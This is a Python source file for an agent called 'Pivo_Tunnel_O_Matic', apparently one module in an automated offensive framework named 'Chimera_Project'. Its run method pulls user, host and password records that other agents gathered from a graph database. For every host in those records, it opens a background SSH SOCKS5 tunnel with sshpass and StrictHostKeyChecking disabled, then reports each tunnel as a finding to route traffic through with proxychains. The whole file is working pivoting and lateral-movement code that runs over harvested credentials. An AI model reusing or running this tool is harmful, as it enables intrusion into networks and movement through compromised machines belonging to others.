import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import subprocess
import logging
import time

# Ensure the agent can find the core directory for imports
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Pivo_Tunnel_O_Matic:
    def __init__(self):
        self.agent_id = "38"
        self.name = "Pivo_Tunnel_O_Matic"
        self.db = ChimeraDB()
        
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(self.name)
        self.logger.addHandler(logging.StreamHandler())

    def establish_tunnel(self, remote_host, user, password, local_port=9050):
        """Creates a background SSH SOCKS proxy."""
        self.logger.info(f"Establishing SOCKS5 tunnel via {remote_host} on local port {local_port}...")
        
        # -D: Dynamic Port Forwarding (SOCKS)
        # -f: Run in background
        # -N: Do not execute remote command
        # -q: Quiet mode
        cmd = [
            "sshpass", "-p", password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-D", str(local_port),
            "-f", "-N", f"{user}@{remote_host}"
        ]

        try:
            subprocess.run(cmd, check=True)
            self.logger.info(f"[+++] TUNNEL ACTIVE: Use proxychains on port {local_port}")
            
            self.db.report_finding(self.name, "Network_Tunnel", {
                "entry_node": remote_host,
                "proxy_type": "SOCKS5",
                "local_port": local_port,
                "status": "active"
            })
            return True
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to establish tunnel: {e}")
            return False

    def run(self):
        self.db.heartbeat(self.name)
        
        # Query for credentials found by other agents (like SSH_Hunter)
        query = """
        MATCH (u:User)-[:OWNS_CRED]->(c:Credential)
        MATCH (h:Host {ip: c.target_ip})
        RETURN h.ip as ip, u.name as user, c.secret as password
        """
        
        with self.db.driver.session() as session:
            results = session.run(query)
            for record in results:
                # Attempt to tunnel through every machine we have creds for
                self.establish_tunnel(record['ip'], record['user'], record['password'])
        
        self.db.close()

if __name__ == "__main__":
    agent = Pivo_Tunnel_O_Matic()
    agent.run()
